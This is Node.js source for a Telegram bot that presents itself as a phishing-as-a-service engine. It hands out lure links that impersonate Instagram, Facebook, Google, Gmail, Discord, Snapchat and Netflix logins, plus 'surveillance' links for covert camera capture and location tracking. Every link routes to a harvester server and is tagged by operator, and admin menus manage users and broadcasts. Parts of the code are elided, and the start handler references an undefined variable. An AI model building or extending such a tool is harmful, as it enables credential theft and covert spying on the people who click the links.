const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// --- ⚙️ CONFIGURATION ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: [], admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(parseInt(userId));
};

// --- KEYBOARDS ---
const adminKeyboard = [
    [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
    [{ text: "🔗 Phishing Links", callback_data: "admin_phishing" }, { text: "🛰️ Surveillance Links", callback_data: "admin_surveillance" }],
    [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
    [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
];
const phishingKeyboard = [
    [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
    [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '✉️ Gmail', callback_data: 'gen_link_Gmail' }],
    [{ text: '💬 Discord', callback_data: 'gen_link_Discord' }, { text: '✅ Insta Blue Tick', callback_data: 'gen_link_InstaBlueTick' }],
    [{ text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
    [{ text: '⬅️ Back to Main Menu', callback_data: 'main_menu_back' }]
];
const surveillanceKeyboard = [
    [{ text: '📸 Camera Capture', callback_data: 'gen_surv_Camera' }, { text: '📍 Location Tracker', callback_data: 'gen_surv_Location' }],
    [{ text: '🎤 Microphone (Soon)', callback_data: 'soon' }, { text: '📹 Video Capture (Soon)', callback_data: 'soon' }],
    [{ text: '⬅️ Back to Main Menu', callback_data: 'main_menu_back' }]
];
const userMainMenu = [
    [{ text: '🔐 Phishing Links', callback_data: 'user_phishing' }, { text: '🛰️ Surveillance Links', callback_data: 'user_surveillance' }]
];

// --- /start COMMAND ---
bot.onText(/\/start/, async (msg) => {
    // ... (Start command waisa hi rahega) ...
    // Welcome message ke baad...
    if (isAdmin(userId)) {
        bot.sendMessage(userId, "👑 **Admin Panel Activated** 👑", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
    } else {
        bot.sendMessage(userId, "✅ **Access Granted!**\nSelect a tool from the menu below.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: userMainMenu } });
    }
});

// --- CALLBACK QUERY HANDLER ---
bot.on('callback_query', (query) => {
    const userId = query.from.id;
    const data = query.data;
    const messageId = query.message.message_id;

    if (data === 'check_join' || data === 'soon') return bot.answerCallbackQuery(query.id);

    const [type, command, service] = data.split('_');

    // Main Menu Navigation for Users
    if (type === 'user') {
        if (command === 'phishing') {
            bot.editMessageText("🔐 **Phishing Link Generator**\nSelect a service:", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: phishingKeyboard } });
        } else if (command === 'surveillance') {
            bot.editMessageText("🛰️ **Surveillance Link Generator**\nSelect a tool:", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: surveillanceKeyboard } });
        }
    }

    // Link Generation (Phishing)
    else if (type === 'gen' && command === 'link') {
        const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        bot.sendMessage(userId, `✅ **Link for [${service}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
    } 
    // Link Generation (Surveillance)
    else if (type === 'gen' && command === 'surv') {
        const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        bot.sendMessage(userId, `✅ **Surveillance Link for [${service}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
    }
    
    // Admin Commands
    else if (type === 'admin' || data === 'main_menu_back') {
        if (!isAdmin(userId)) return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });
        
        if (command === 'phishing' || (type === 'admin' && command === 'generate')) { // Alias
             bot.editMessageText("🔗 **Phishing Link Generator**", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: phishingKeyboard } });
        } else if (command === 'surveillance') {
             bot.editMessageText("🛰️ **Surveillance Link Generator**", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: surveillanceKeyboard } });
        } else if (command === 'status' || command === 'panel' || data === 'main_menu_back') {
             const db = readDb();
             const statusText = `📊 **Bot Status**\n\n👥 Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`;
             bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else {
             const prompts = { 'broadcast': '...', 'add': '...', 'remove': '...', 'block': '...', 'unblock': '...' };
             if (prompts[command]) {
                 adminState[userId] = command;
                 bot.sendMessage(userId, prompts[command]);
             }
        }
    }
    
    bot.answerCallbackQuery(query.id);
});

// ... (Message handler waisa hi rahega) ...

console.log('🔥 OSINT & PhaaS Engine is online.');
